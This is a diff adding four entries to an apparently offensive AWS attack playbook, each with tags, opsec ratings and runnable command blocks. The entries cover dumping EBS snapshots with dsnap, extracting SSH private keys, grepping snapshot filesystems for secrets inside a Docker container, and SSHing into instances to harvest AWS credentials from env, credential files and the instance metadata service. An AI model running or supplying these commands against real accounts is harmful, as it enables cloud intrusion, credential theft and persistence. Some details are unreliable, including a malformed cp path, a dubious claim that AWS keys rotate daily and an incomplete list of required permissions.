@@ -240,3 +240,111 @@ aws ec2-instance-connect send-ssh-public-key \
 # Step 5: SSH into the instance using the temporary key (must connect within 60 seconds)
 ssh -i /tmp/temp_key ec2-user@INSTANCE_PUBLIC_IP
 ```
+
+### EBS Snapshot Dumping via dsnap Tool [added: 2026-05]
+- **Tags:** #AWS #EBS #Snapshot #dsnap #DataExfil #SnapshotDump #FileSystemAccess #CredentialTheft
+- **Trigger:** IAM permissions allow listing/describing EBS snapshots; target snapshot contains sensitive data or credentials
+- **Prereq:** AWS credentials with `ec2:DescribeSnapshots` permission; dsnap tool installed (pipx); target snapshot must be in the same region or shared with attacker account
+- **Yields:** Full filesystem contents of the snapshot (including configs, SSH keys, application data)
+- **Opsec:** Low (snapshot enumeration is passive; dumping via tool may not leave logs depending on snapshot sharing model)
+- **Context:** dsnap is a tool that directly downloads EBS snapshot blocks without needing EC2 instances. Faster than traditional snapshot → create-volume → attach → mount approach. Enables rapid extraction of sensitive files like SSH private keys from compromised instances.
+- **Payload/Method:**
+  ```bash
+  # Install dsnap via pipx
+  pipx install git+https://github.com/RhinoSecurityLabs/dsnap.git
+  
+  # List snapshots in current region
+  aws ec2 describe-snapshots --owner-ids self
+  
+  # Download snapshot contents using dsnap
+  dsnap --snapshot-id snap-xxxxxxxxx --download-dir ./snapshot_dump
+  
+  # Extract filesystem from snapshot
+  ls -la ./snapshot_dump/
+  ```
+- **Note:** dsnap can mount snapshot contents directly in some cases; if snapshot is shared cross-account, ensure target account permissions allow it.
+
+### SSH Private Key Extraction from EBS Snapshot [added: 2026-05]
+- **Tags:** #AWS #EBS #Snapshot #SSHKeys #CredentialTheft #PrivateKeyExfil #LateralMovement #PrivEsc
+- **Trigger:** Dumped/mounted EBS snapshot contains user home directories (Linux) or known SSH key paths
+- **Prereq:** Filesystem access to snapshot (via dsnap dump, snapshot mount, or container overlay); target instance uses SSH keys for authentication
+- **Yields:** SSH private keys allowing lateral movement to target instances or other systems using key-based auth
+- **Opsec:** Low (once snapshot is mounted, extraction is local)
+- **Context:** Compromised EC2 instances often store SSH private keys in `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, etc. Extracting these from snapshots bypasses the need for instance access and allows SSH connection to the instance using the extracted key.
+- **Payload/Method:**
+  ```bash
+  # After dumping snapshot via dsnap or mounting it:
+  
+  # For Linux snapshots, common SSH key paths:
+  find ./snapshot_dump -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys"
+  
+  # Extract keys
+  cp ./snapshot_dump/home/*//.ssh/id_rsa ./extracted_key
+  chmod 600 ./extracted_key
+  
+  # Use extracted key for SSH access (requires knowing target IP)
+  ssh -i ./extracted_key ubuntu@<instance-ip>
+  
+  # For AWS targets, cross-reference snapshot with running instances via EC2 API:
+  aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId, PrivateIpAddress, ImageId]'
+  ```
+
+### Docker Container Build from EBS Snapshot Filesystem [added: 2026-05]
+- **Tags:** #AWS #EBS #Snapshot #Docker #Container #FileSystemAccess #DataExfil #Forensics
+- **Trigger:** Snapshot contains complete application or system filesystem; need interactive access to extracted files or credential discovery
+- **Prereq:** dsnap dump or mounted snapshot filesystem; Docker installed; ability to write Dockerfile
+- **Yields:** Running container with full snapshot filesystem accessible — enables credential harvesting, database inspection, configuration review
+- **Opsec:** Low (container runs locally)
+- **Context:** After dumping snapshot contents, build a Docker image from the filesystem to gain interactive access and search for credentials (DB connection strings, API keys, SSH keys) embedded in configs or environment files.
+- **Payload/Method:**
+  ```bash
+  # After dumping snapshot with dsnap:
+  cd ./snapshot_dump
+  
+  # Create Dockerfile pointing to snapshot filesystem root
+  cat > Dockerfile << 'DOCKER'
+  FROM scratch
+  COPY ./ /
+  ENTRYPOINT ["/bin/bash"]
+  DOCKER
+  
+  # Build image
+  docker build -t snapshot-fs .
+  
+  # Run container with snapshot filesystem
+  docker run -it snapshot-fs /bin/bash
+  
+  # Inside container, search for credentials:
+  grep -r "password\|secret\|key\|token" /etc/ /opt/ /home/ 2>/dev/null
+  find / -name "*.pem" -o -name "*.key" 2>/dev/null
+  cat /etc/passwd  # user enumeration
+  ```
+
+### AWS Credential Rotation Bypass via Snapshot-Extracted SSH Keys [added: 2026-05]
+- **Tags:** #AWS #EBS #Snapshot #SSHKeys #CredentialBypass #KeyRotation #LateralMovement #Persistence
+- **Trigger:** AWS console credentials have rotated or expired; SSH keys exist in snapshot or on accessible instance
+- **Prereq:** SSH key extracted from snapshot or found via other means; target instance has SSH enabled and key-based auth configured
+- **Yields:** SSH access to EC2 instance, bypassing temporary credential expiration; access to harvested AWS credentials stored on the instance
+- **Opsec:** Low (SSH connections may not be logged depending on instance logging configuration)
+- **Context:** AWS access keys rotate daily or on demand. Once keys expire, console and API access fail. However, SSH keys embedded in instance filesystems remain valid. Extract keys via snapshot and use them for persistent SSH access to harvest new credentials or re-authenticate.
+- **Payload/Method:**
+  ```bash
+  # Extract SSH key from snapshot
+  extracted_key="./snapshot_key"
+  instance_ip="10.0.0.50"  # from EC2 describe-instances
+  
+  # SSH into instance using extracted key
+  ssh -i $extracted_key ec2-user@$instance_ip
+  
+  # Inside instance, harvest AWS credentials (often in environment or metadata):
+  env | grep -i aws
+  cat /home/ec2-user/.aws/credentials
+  
+  # Query metadata service for temporary credentials
+  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+  
+  # Use harvested credentials for lateral movement or privilege escalation
+  export AWS_ACCESS_KEY_ID=<harvested-key>
+  export AWS_SECRET_ACCESS_KEY=<harvested-secret>
+  aws sts get-caller-identity
+  ```
